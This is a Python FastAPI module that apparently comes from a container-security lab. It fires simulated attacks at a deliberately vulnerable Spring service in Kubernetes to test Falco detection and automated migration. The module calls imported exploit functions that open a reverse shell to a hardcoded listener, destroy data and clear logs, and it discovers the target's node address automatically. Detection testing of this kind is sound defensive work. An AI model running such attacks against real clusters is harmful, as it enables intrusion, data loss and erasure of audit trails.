from fastapi import APIRouter, HTTPException
import os
import re
import sys
from models.simulation_info import SimulationInfo
from requests import exceptions as requests_exceptions
from utils.k8s_client import k8s_client

sys.path.append('/home/ubuntu/ContMigration-VT1/apps/kubernetes/vuln-spring/')

from vuln_spring_exploit import reverse_shell, data_destruction, log_removal  # type: ignore

router = APIRouter()
DEFAULT_SIMULATION_TARGET_URL = "http://10.0.0.29:30081"
DEFAULT_TARGET_URL = (os.getenv("SIMULATION_TARGET_URL", DEFAULT_SIMULATION_TARGET_URL) or DEFAULT_SIMULATION_TARGET_URL).rstrip("/")
DEFAULT_REVERSE_SHELL_LISTENER_IP = os.getenv("SIMULATION_LISTENER_IP", "10.0.0.180")
DEFAULT_REVERSE_SHELL_LISTENER_PORT = os.getenv("SIMULATION_LISTENER_PORT", "4444")
SUPPORTED_APP_PREFIX = "vuln-spring"
VULN_SPRING_SERVICE_NAME = "vuln-spring"
VULN_SPRING_NAMESPACES = ("istio-enabled", "default")

# Every simulated attack performs an action that Falco picks up with a specific default
# rule. We keep this mapping authoritative on the backend so the UI and the user understand
# which Falco rule (and therefore which config.json entry) will fire after the attack.
ATTACK_FALCO_RULES: dict[str, str] = {
    "reverse_shell": "Redirect STDOUT/STDIN to Network Connection in Container",
    "data_destruction": "Remove Bulk Data from Disk",
    "log_removal": "Clear Log Activities",
}
SUPPORTED_ATTACK_TYPES = set(ATTACK_FALCO_RULES.keys())


def _env_override_for_cluster(cluster: str) -> str | None:
    """Allow operators to pin a target URL per cluster via env (e.g. SIMULATION_TARGET_URL_CLUSTER1)."""
    if not cluster:
        return None
    key = "SIMULATION_TARGET_URL_" + re.sub(r"[^A-Za-z0-9]", "_", cluster).upper()
    value = os.getenv(key)
    return value.rstrip("/") if value else None


def _find_vuln_spring_nodeport(client_api, namespaces: tuple[str, ...] = VULN_SPRING_NAMESPACES):
    """Locate the vuln-spring Service in the cluster and return (namespace, nodePort)."""
    for namespace in namespaces:
        try:
            svc = client_api.read_namespaced_service(name=VULN_SPRING_SERVICE_NAME, namespace=namespace)
        except Exception:
            continue
        for port in (svc.spec.ports or []):
            if port.node_port:
                return namespace, int(port.node_port)
    return None, None


def _pick_node_address(client_api) -> str | None:
    """Pick a usable node address (prefer ExternalIP, fall back to InternalIP) from any Ready node."""
    try:
        nodes = client_api.list_node()
    except Exception:
        return None

    def is_ready(node) -> bool:
        for condition in (node.status.conditions or []):
            if condition.type == "Ready":
                return condition.status == "True"
        return False

    ready_nodes = [n for n in nodes.items if is_ready(n)] or nodes.items
    for address_type in ("ExternalIP", "InternalIP"):
        for node in ready_nodes:
            for addr in (node.status.addresses or []):
                if addr.type == address_type and addr.address:
                    return addr.address
    return None


def _resolve_target_url(cluster: str | None) -> tuple[str, dict]:
    """Resolve the vuln-spring attack URL for the given cluster.

    Resolution order:
      1) env override SIMULATION_TARGET_URL_<CLUSTER>
      2) auto-discovery via Kubernetes API (Service NodePort + Node IP)
      3) global default SIMULATION_TARGET_URL / hardcoded fallback
    Returns the URL plus a metadata dict for the response (source, namespace, etc.).
    """
    if cluster:
        override = _env_override_for_cluster(cluster)
        if override:
            return override, {"source": "env_override", "cluster": cluster}

        try:
            client_api = k8s_client.get_client(cluster)
        except Exception as exc:
            raise HTTPException(status_code=400, detail=f"Unknown cluster: {cluster} ({exc})") from exc

        namespace, node_port = _find_vuln_spring_nodeport(client_api)
        if not node_port:
            raise HTTPException(
                status_code=404,
                detail=(
                    f"Service '{VULN_SPRING_SERVICE_NAME}' with a NodePort not found in "
                    f"{'/'.join(VULN_SPRING_NAMESPACES)} on cluster '{cluster}'"
                ),
            )
        node_ip = _pick_node_address(client_api)
        if not node_ip:
            raise HTTPException(
                status_code=503,
                detail=f"No Ready node with a routable address found on cluster '{cluster}'",
            )
        return f"http://{node_ip}:{node_port}", {
            "source": "auto_discovery",
            "cluster": cluster,
            "namespace": namespace,
            "nodePort": node_port,
            "nodeAddress": node_ip,
        }

    return DEFAULT_TARGET_URL, {"source": "default", "cluster": None}


def _find_running_pod(cluster: str, namespace: str | None, app_name: str) -> str | None:
    """Best-effort lookup of a running pod backing the attacked Service (for response info)."""
    if not cluster or not app_name:
        return None
    try:
        client_api = k8s_client.get_client(cluster)
    except Exception:
        return None
    namespaces = [namespace] if namespace else list(VULN_SPRING_NAMESPACES)
    for ns in namespaces:
        try:
            pods = client_api.list_namespaced_pod(namespace=ns, label_selector=f"app={app_name}")
        except Exception:
            continue
        for pod in pods.items:
            if pod.status and pod.status.phase == "Running":
                return pod.metadata.name
    return None


@router.get("/attack-mapping")
def get_attack_mapping():
    """Expose the static attack -> Falco rule mapping for the frontend."""
    return {
        "mapping": [
            {"attackType": attack, "falcoRule": rule}
            for attack, rule in ATTACK_FALCO_RULES.items()
        ]
    }


@router.post("")
def simulate(simInfo: SimulationInfo):
    """Trigger a real attack against the vuln-spring NodePort on the chosen cluster.

    Migration is **not** triggered here anymore. Falco running on the cluster detects the
    attack and posts an alert to /alert, which then consults config.json to decide
    whether to migrate or just log the event.
    """
    print(f"Received simulation request for {simInfo.attackType} on cluster {simInfo.cluster}")
    app_name = (simInfo.appName or "").strip()
    attack_type = (simInfo.attackType or "").strip()
    cluster = (simInfo.cluster or "").strip() or None
    namespace = (simInfo.namespace or "").strip() or None

    if not app_name:
        raise HTTPException(status_code=400, detail="appName is required")
    if not attack_type:
        raise HTTPException(status_code=400, detail="attackType is required")
    if attack_type not in SUPPORTED_ATTACK_TYPES:
        raise HTTPException(status_code=400, detail=f"Unsupported attackType: {attack_type}")
    if not app_name.startswith(SUPPORTED_APP_PREFIX):
        raise HTTPException(
            status_code=400,
            detail=f"Simulation currently supports only apps starting with '{SUPPORTED_APP_PREFIX}'. Received '{app_name}'."
        )

    falco_rule = ATTACK_FALCO_RULES[attack_type]
    target_url, target_meta = _resolve_target_url(cluster)
    resolved_namespace = namespace or target_meta.get("namespace")
    pod_name = _find_running_pod(cluster, resolved_namespace, app_name) if cluster else None

    try:
        if attack_type == "reverse_shell":
            reverse_shell(target_url, DEFAULT_REVERSE_SHELL_LISTENER_IP, DEFAULT_REVERSE_SHELL_LISTENER_PORT)
            simulation_message = "Reverse shell command executed"
        elif attack_type == "data_destruction":
            data_destruction(target_url)
            simulation_message = "Data destruction command executed"
        else:
            log_removal(target_url)
            simulation_message = "Log removal command executed"

        return {
            "message": simulation_message,
            "appName": app_name,
            "attackType": attack_type,
            "falcoRule": falco_rule,
            "cluster": cluster,
            "namespace": resolved_namespace,
            "podName": pod_name,
            "targetUrl": target_url,
            "targetSource": target_meta.get("source"),
            "detail": (
                f"Attack '{attack_type}' executed against {target_url}"
                + (f" (cluster '{cluster}'" if cluster else "")
                + (f", namespace '{resolved_namespace}'" if resolved_namespace else "")
                + (f", pod '{pod_name}'" if pod_name else "")
                + (")" if cluster else "")
                + f". Falco should now raise rule '{falco_rule}'; any migration is handled "
                + "by /alert according to config.json."
            ),
        }
    except requests_exceptions.RequestException as exc:
        raise HTTPException(status_code=502, detail=f"Simulation target unreachable at {target_url}: {exc}") from exc
